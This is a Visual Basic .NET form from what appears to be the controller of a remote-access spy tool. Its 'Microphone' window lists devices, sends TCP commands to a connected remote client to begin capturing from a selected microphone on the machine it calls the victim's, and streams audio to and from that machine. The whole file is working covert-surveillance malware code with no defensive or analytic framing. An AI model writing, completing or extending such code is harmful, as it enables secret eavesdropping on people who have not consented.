Imports System.ComponentModel
Imports WinMM
Public Class Microphone

    Public classClient As sockets.Client

    Public Client As Net.Sockets.TcpClient

    Public ClientWaveOut As Net.Sockets.TcpClient

    Public classWaveOut As sockets.Client

    Public waveOut As WaveOut = Nothing

    Private WaveIin As WaveIn

    Public Title As String = "null"

    Public bytes As New List(Of Byte())

    Public WithEvents Bgworker As ComponentModel.BackgroundWorker

    Public ClientWaveIn As Net.Sockets.TcpClient

    Public classWaveIn As sockets.Client

    Private DoCase As Boolean

    Public MDeviceId As Integer

    Public rateInput As Integer

    Sub New()

        InitializeComponent()

        Me.Font = reso.f

    End Sub


    Private Sub SpyStyle()
        Me.BackColor = SpySettings.DefaultColor_Background
        For Each gr As ComboBox In Panel1.Controls.OfType(Of ComboBox)()
            gr.ForeColor = SpySettings.DefaultColor_Foreground
            gr.BackColor = SpySettings.DefaultColor_Background
        Next
        For Each gr As ComboBox In Panel2.Controls.OfType(Of ComboBox)()
            gr.ForeColor = SpySettings.DefaultColor_Foreground
            gr.BackColor = SpySettings.DefaultColor_Background
        Next
        For Each gr As Label In Panel1.Controls.OfType(Of Label)()
            gr.ForeColor = SpySettings.DefaultColor_Foreground
            gr.BackColor = SpySettings.DefaultColor_Background
        Next
        For Each gr As Button In Panel1.Controls.OfType(Of Button)()
            gr.BackColor = SpySettings.DefaultColor_Foreground
            gr.ForeColor = SpySettings.DefaultColor_Background
        Next
        For Each gr As Label In Panel2.Controls.OfType(Of Label)()
            gr.ForeColor = SpySettings.DefaultColor_Foreground
            gr.BackColor = SpySettings.DefaultColor_Background
        Next
        For Each gr As Button In Panel2.Controls.OfType(Of Button)()
            gr.BackColor = SpySettings.DefaultColor_Foreground
            gr.ForeColor = SpySettings.DefaultColor_Background
        Next
        For Each gr As Panel In Me.Controls.OfType(Of Panel)()
            gr.BackColor = SpySettings.DefaultColor_Background
        Next
        For Each gr As Label In Me.Controls.OfType(Of Label)()
            gr.ForeColor = SpySettings.DefaultColor_Foreground
            gr.BackColor = SpySettings.DefaultColor_Background
        Next
    End Sub
    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Sub Microphone_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Me.Icon = New Icon(reso.res_Path & "\Icons\win\13.ico")

        LoadDEVMicrophone()

        Me.Text = Title

        SpyStyle()

        Me.TOpacity.Interval = SpySettings.T_Interval

        SizeH()

        Me.TOpacity.Enabled = True

    End Sub
    Public Sub SizeH()
        Dim y As Integer = 0

        If Panel1.Visible Then

            y += Panel1.Height

        End If

        If Panel2.Visible Then

            y += Panel2.Height

        End If

        Dim TitlebarHeight As Integer = Me.Height - Me.ClientSize.Height - 1

        If Not Panel1.Visible And Not Panel2.Visible Then

            LAB_ERR.Visible = True

            LAB_ERR.Text = "No Input and No Output Devices Found"

            y = LAB_ERR.Height

        End If

        Me.Height = y + TitlebarHeight

    End Sub

    Private Sub Microphone_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing


        If waveOut IsNot Nothing Then

            waveOut.Stop()

        End If


        If Not classWaveOut Is Nothing Then

            classWaveOut.qit = True

            classWaveOut.Close(ClientWaveOut)

        End If

        If Not classWaveIn Is Nothing Then

            classWaveIn.qit = True

            classWaveIn.Close(ClientWaveIn)

        End If

        In_Stop()

    End Sub


    Private Sub b_sta_Click(sender As Object, e As EventArgs) Handles b_sta.Click

        If b_sta.Tag = 2 Then

            Out_Stop()

            b_sta.Tag = 0

            b_sta.Text = "Start"

        ElseIf b_sta.Tag = 0 Then

            b_sta.Tag = 1

            b_sta.Text = "..."

            Out_Start()

        End If
    End Sub
    Private Sub Out_Start()
        If Not classClient Is Nothing Then

            Dim spl As String() = classClient.Keys.Split(":")

            Dim CK_OutSource As Integer = OutBoxSource.SelectedIndex


            If classClient.Keys.Split(":")(7).Chars(1) = "0"c Then

                Dim objsToFront As Object() = {Client, SecurityKey.KeysClient6 & sockets.Data.SPL_SOCKET, Codes.Encoding().GetBytes("null"), classClient}

                classClient.Send(objsToFront)

            End If

            Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".microphone" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "start" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & reso.HzInt(OutHZ.Text) & sockets.Data.SPL_DATA & SecurityKey.MicwaveOutByte & sockets.Data.SPL_DATA & classClient.ClientRemoteAddress & sockets.Data.SPL_DATA & CK_OutSource.ToString, Codes.Encoding().GetBytes("null"), classClient}

            classClient.Send(objs)

        End If
    End Sub
    Public Sub Out_Stop()

        If classWaveOut IsNot Nothing Then

            classWaveOut.qit = True

            classWaveOut.Close(ClientWaveOut)

        End If

        If waveOut IsNot Nothing Then
            waveOut.Stop()
        End If


        waveOut = Nothing
    End Sub

    Public Function In_Start(ByVal idDevice As Integer) As Boolean

        WaveIn = New WaveIn(idDevice) 'id dev


        'WaveIn.BufferSize = reso.HzInt(inHZ.Text)
        'WaveIn.BufferQueueSize = 400

        WaveIn.Open(reso.FormatWave(rateInput))

        WaveIn.Start()

        Me.Bgworker = New ComponentModel.BackgroundWorker

        If Not Bgworker.IsBusy Then

            DoCase = True

            Bgworker.RunWorkerAsync()

            If bIN.Tag = 1 Then

                bIN.Tag = 2

                bIN.Text = "Ready"

            End If

        End If

        Return True



    End Function
    Private Sub In_Stop()

        DoCase = False

        If Bgworker IsNot Nothing Then

            If Bgworker.IsBusy Then

                Bgworker.Dispose()

            End If

        End If


        bytes.Clear()

        If Not classWaveIn Is Nothing Then

            classWaveIn.qit = True

            classWaveIn.Close(ClientWaveIn)

        End If


        If waveOut IsNot Nothing Then

            waveOut.Stop()

        End If




    End Sub

    Private Sub LoadDEVMicrophone()

        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = WaveIn.Devices.GetEnumerator

            Do While IEnume.MoveNext

                Dim num As WaveInDeviceCaps = IEnume.Current

                If Not num.DeviceId = -1 Then
                    num.Name = num.Name.Replace("(", "").Replace(")", "")

                    Dim item As String = String.Format("({0})-{1}", num.DeviceId, num.Name)

                    InBoxSource.Items.Add(item)

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try

        If InBoxSource.Items.Count = 0 Then

            Panel2.Visible = False

        Else

            InBoxSource.SelectedIndex = 0

            DeviceSOurVictim.SelectedIndex = 0

            inHZ.SelectedIndex = 0

        End If


    End Sub


    Private Sub OK_DataReady(ByVal sender As Object, ByVal e As DataReadyEventArgs)

        bytes.Add(e.Data)


    End Sub

    Private Sub bIN_Click(sender As Object, e As EventArgs) Handles bIN.Click

        If Not classClient Is Nothing Then

            If bIN.Tag = 0 Then

                In_Stop()

                bytes.Clear()

                Dim spl As String() = classClient.Keys.Split(":")

                Dim CK_InSource As Integer = DeviceSOurVictim.SelectedIndex

                Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".microphone" & sockets.Data.SPL_SOCKET & "method" &
                sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "input" &
                sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & classClient.ClientRemoteAddress &
                sockets.Data.SPL_DATA & SecurityKey.MicwaveinByte & sockets.Data.SPL_DATA & CK_InSource.ToString & sockets.Data.SPL_DATA & reso.HzInt(inHZ.Text), Codes.Encoding().GetBytes("null"), classClient}

                classClient.Send(objs)

                bIN.Tag = 1

                bIN.Text = "Cancel..."


            ElseIf bIN.Tag = 1 Then

                In_Stop()

                bIN.Text = "Run"

                bIN.Tag = 0

            ElseIf bIN.Tag = 2 Then

                In_Stop()

                bIN.Text = "Run"

                bIN.Tag = 0

            End If



        End If

    End Sub



    Private Sub Worker_DoWork(ByVal sender As Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles Bgworker.DoWork

        Do

        If bytes.Count > 0 Then

                Dim p As Byte() = bytes(0)

                Try

                    If ClientWaveIn.Client.Connected Then

                        ClientWaveIn.Client.Poll(infoServer.Microseconds, Net.Sockets.SelectMode.SelectWrite)

                        ClientWaveIn.Client.SendBufferSize = p.Length * 15

                        ClientWaveIn.GetStream.Write(p, 0, p.Length)

                        infoServer.BytesSent += p.Length

                    End If

                Catch ex As Exception

                    'Exit Do 'disconncted

                End Try

                If Not DoCase = False Then
                    bytes.RemoveAt(0)
                End If


            End If
            Threading.Thread.Sleep(1)

        Loop While DoCase

    End Sub


    Public Overridable Property WaveIn As WaveIn
        Get
            Return Me.WaveIin
        End Get
        <Runtime.CompilerServices.MethodImpl(Runtime.CompilerServices.MethodImplOptions.Synchronized)>
        Set(ByVal WithEventsValue As WaveIn)
            Dim handler As EventHandler(Of DataReadyEventArgs) = New EventHandler(Of DataReadyEventArgs)(AddressOf Me.OK_DataReady)
            If (Not Me.WaveIin Is Nothing) Then
                RemoveHandler Me.WaveIin.DataReady, handler
            End If
            Me.WaveIin = WithEventsValue
            If (Not Me.WaveIin Is Nothing) Then
                AddHandler Me.WaveIin.DataReady, handler
            End If
        End Set
    End Property

    Private Sub InBoxSource_SelectedIndexChanged(sender As Object, e As EventArgs) Handles InBoxSource.SelectedIndexChanged

        Dim rgx As String = System.Text.RegularExpressions.Regex.Match(InBoxSource.SelectedItem.ToString, "(?<=" & System.Text.RegularExpressions.Regex.Escape("(") & ").+?(?=" & System.Text.RegularExpressions.Regex.Escape(")") & ")", System.Text.RegularExpressions.RegexOptions.IgnoreCase).Value

        MDeviceId = CInt(rgx.Trim)

    End Sub

    Private Sub OutBoxSource_SelectedIndexChanged(sender As Object, e As EventArgs) Handles OutBoxSource.SelectedIndexChanged

    End Sub
End Class

